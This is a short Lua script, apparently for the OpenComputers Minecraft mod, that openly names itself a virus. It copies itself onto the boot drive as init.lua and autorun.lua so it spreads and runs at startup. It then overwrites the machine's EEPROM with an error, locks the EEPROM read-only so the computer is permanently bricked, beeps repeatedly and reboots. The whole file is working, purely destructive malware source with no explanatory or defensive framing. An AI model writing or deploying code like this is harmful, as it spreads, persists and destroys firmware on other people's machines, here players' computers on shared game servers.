local component = require("component")
local filesystem = require('filesystem')
local computer = require("computer")

a = 0
local path = computer.getBootAddress():sub(1,3)
filesystem.copy('mnt/489/init.lua', 'mnt/'..path..'/init.lua')
filesystem.copy('mnt/489/data.lua', 'mnt/'..path..'/autorun.lua')

component.eeprom.set('error("virus by darlexxbit")')
local checksum = component.eeprom.getChecksum()
component.eeprom.makeReadonly(checksum)

while a < 15 do
  computer.beep(2000, 0.1)
  a = a+1
end
computer.shutdown(true)
